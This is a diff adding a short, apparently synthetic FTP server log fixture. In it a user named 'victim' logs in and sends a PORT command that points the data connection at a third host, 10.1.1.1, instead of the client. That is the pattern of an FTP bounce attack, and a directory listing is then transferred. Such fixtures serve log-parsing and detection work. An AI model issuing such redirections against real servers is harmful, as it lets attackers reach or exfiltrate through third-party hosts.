@@ -1,0 +1,11 @@
+Wed Dec  7 16:07:32 2022 [pid 01] CONNECT: Client "192.168.94.20"
+Wed Dec  7 16:07:32 2022 [pid 02]: <--- 230
+Wed Dec  7 16:07:32 2022 [pid 03]: User "victim" logged in.
+Wed Dec  7 16:07:32 2022 [pid 04]: command: PORT 10,1,1,1,229,54^M
+Wed Dec  7 16:07:32 2022 [pid 05]: <--- 200
+Wed Dec  7 16:07:32 2022 [pid 06]: PORT command successful.
+Wed Dec  7 16:07:32 2022 [pid 07]: command: LIST^M
+Wed Dec  7 16:07:32 2022 [pid 08]: <--- 150
+Wed Dec  7 16:07:32 2022 [pid 09]: Opening data connection for /bin/ls.
+Wed Dec  7 16:07:32 2022 [pid 10]: <--- 226
+Wed Dec  7 16:07:32 2022 [pid 11]: Transfer complete
